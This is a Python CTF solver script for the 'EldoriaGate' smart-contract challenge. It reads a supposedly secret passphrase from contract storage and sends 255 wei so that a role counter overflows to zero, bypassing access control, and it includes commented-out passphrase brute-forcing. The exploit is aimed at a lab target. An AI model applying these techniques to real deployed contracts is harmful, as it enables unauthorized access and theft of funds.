#!/usr/bin/env python

from pwn import *
import subprocess


context.log_level = 'error'

GIVEN_RPC = "83.136.253.44:54016"
GIVEN_TCP = "83.136.253.44:59753"

RPC_URL = f"http://{GIVEN_RPC}/"

TCP_IP   = GIVEN_TCP.split(":")[0]
TCP_PORT = int(GIVEN_TCP.split(":")[1])




def init():
    p = remote(TCP_IP, TCP_PORT)

    p.sendline(b"1")
    p.recvuntil(b"Retrieving connection informations...\n\n")
    data = p.recvall().decode().split("\n")

    global PRIV_KEY
    global PLAYER_ADDR
    global TARGET_ADDR
    global SETUP_ADDR

    PRIV_KEY    = data[0].split(": ")[1]
    PLAYER_ADDR = data[1].split(": ")[1]
    TARGET_ADDR = data[2].split(": ")[1]
    SETUP_ADDR  = data[3].split(": ")[1]


def get_flag():
    p = remote(TCP_IP, TCP_PORT)

    p.sendline(b"3")
    p.recvuntil(b": ")
    print(p.recvall().decode())


def reset():
    p = remote(TCP_IP, TCP_PORT)

    p.sendline(b"2")
    p.recvuntil(b": ")
    print(p.recvall().decode())

def get_balance(player_addr):
    print(subprocess.check_output(["cast", "balance", "--rpc-url", RPC_URL, player_addr], text=True))

# def check_passphrase(i):
#     passphrase = f"0x{i:02x}000000"

#     try:
#         print(subprocess.check_output(["cast", "call", TARGET_ADDR, "enter(bytes4)", passphrase, "--value", "0", "--rpc-url", RPC_URL, PLAYER_ADDR], text=True))
#         print(f"[*] The passphrase '{passphrase}' worked!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
#         return True
#     except subprocess.CalledProcessError:
#         print(f"[*] The passphrase '{passphrase}' didn't work...")
#         return False

def new_contract(contract_path, dry_run=False):
    cmd = ["forge", "create", contract_path, "--rpc-url", RPC_URL, "--private-key", PRIV_KEY, "--constructor-args", TARGET_ADDR]

    if dry_run:
        cmd.insert(-2, "--broadcast")

    # print(" ".join(cmd))
    results = subprocess.check_output(cmd, text=True).split("\n")

    for line in results:
        if line.startswith("Deployer:"):
            global DEPLOYER_ADDR
            DEPLOYER_ADDR = line.split(": ")[1]
            print("[*] Saved DEPLOYER_ADDR as: " + DEPLOYER_ADDR)

        elif line.startswith("Deployed to:"):
            global DEPLOYED_TO_ADDR
            DEPLOYED_TO_ADDR = line.split(": ")[1]
            print("[*] Saved DEPLOYED_TO_ADDR as: " + DEPLOYED_TO_ADDR)

        elif line.startswith("Transaction hash:"):
            global TRANSACTION_HASH
            TRANSACTION_HASH = line.split(": ")[1]
            print("[*] Saved TRANSACTION_HASH as: " + TRANSACTION_HASH)
    print("Results:")
    print("---------------")
    print("\n".join(results))

def call_contract(contract_address, functionCall):
    # cast send $EXPLOIT_ADDRESS "exploit()" --value 0.0001ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
    function = functionCall.split(" ")[0]

    cmd = ["cast", "send", contract_address, function, "--value", "0.0001ether", "--rpc-url", RPC_URL, "--private-key", PRIV_KEY]

    for parameter in functionCall.split(" ")[::-1][:-1]:
        cmd.insert(4, parameter)

    print(cmd)
    print(" ".join(cmd))
    print(subprocess.check_output(cmd, text=True))

def get_kernel_addr():
    # cast call <ELDORIAGATE_ADDRESS> "kernel()(address)" --rpc-url <RPC_URL>
    cmd = ["cast", "call", TARGET_ADDR, "kernel()(address)", "--rpc-url", RPC_URL]
    return subprocess.check_output(cmd, text=True).strip()

def run_cmd(command_string, print=True):
    cmd = command_string.split(" ")
    result = subprocess.check_output(cmd, text=True)
    if print:
        print(result)
    else:
        return result






## ----------------------------------------
##               Playground
## ----------------------------------------
# reset()

init()

# check_passphrase(1)

# for i in range(256):
#     if check_passphrase(i):
#         break

# basepath="/home/archerr/Tech/CTF/Cyber-Apocalypse-CTF-2025---Tales-from-Eldoria/challenges/EldoriaGate/"
# # new_contract(f"{basepath}./exploit_eldoriagate/src/Exploit.sol:Exploit", True)
# # new_contract(f"{basepath}./exploit_eldoriagate/src/ExploitV2.sol:ExploitV2", True)
# new_contract(f"{basepath}./exploit_eldoriagate/src/DirectExploit.sol:DirectExploit", True)
# call_contract(DEPLOYED_TO_ADDR, f"checkAddress(address) {TARGET_ADDR}")



## Final Solution:
KERNEL_ADDR = get_kernel_addr()
secret_bytes = run_cmd(f"cast storage {KERNEL_ADDR} 0 --rpc-url {RPC_URL}", print=False)[-9:]
run_cmd(f"cast send {TARGET_ADDR} enter(bytes4) 0x{secret_bytes} --value 255wei --private-key {PRIV_KEY} --rpc-url {RPC_URL}")
##                                                                         ^
##                                                                         |
## We send 255 wei so that the role "counter" (which starts at 1) will overflow to zero, thus giving us an empty role

# get_balance(PLAYER_ADDR)
get_flag()
